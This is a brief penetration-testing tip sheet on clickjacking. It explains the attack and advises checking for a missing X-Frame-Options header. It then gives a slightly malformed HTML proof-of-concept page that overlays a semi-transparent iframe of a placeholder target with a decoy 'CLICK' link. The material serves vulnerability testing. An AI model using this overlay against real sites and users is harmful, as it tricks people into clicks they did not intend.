# Clickjacking
Clickjacking and its Tips

%%%%%%%%%%%%%%%%%   Clickjacking   %%%%%%%%%%%%%%%%%%%%%%%%

#Description:

Clickjacking, also known as a "UI redress attack", is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the the top level page. Thus, the attacker is "hijacking" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both.

#Tips:

1) Visit clickjacker.io to check if the site is vulnerable to Clickjacking or not.

2) Test must be perform on both browser i.e Mozila Firefox and Google Chrome.

3) If site doesn't have X-Frame-Option Set, then is may vulnerable to Clickjacking.


# Manually check the Clickjacking.

<html >
<head>
<title>clickjack </title>
</head>
<body>

<style>
iframe { /* iframe */
width:1500px;
height:800px;
position:absolute;
top:0; 
left:0;
filter:alpha;
opacity:0.3;
}
</style>
<div><h1> =click</h1></div>

<iframe src="https:/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
<a href="https://www.google.co.in/" style="position:absolute; align:center; z-index:0; padding-top:415px; padding-bottom:25px; padding-right:455px; padding-left:610px;"><font color="white">CLICK </font></a>

<a href="https://www.google.co.in" style=&#34;display&#58;block; height&#58;100px; width&#58;100px&#34; ><font color="white">a</font></a>


</body>
</html>
</html>

## Enter the URL of the site at the place of https:/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX 
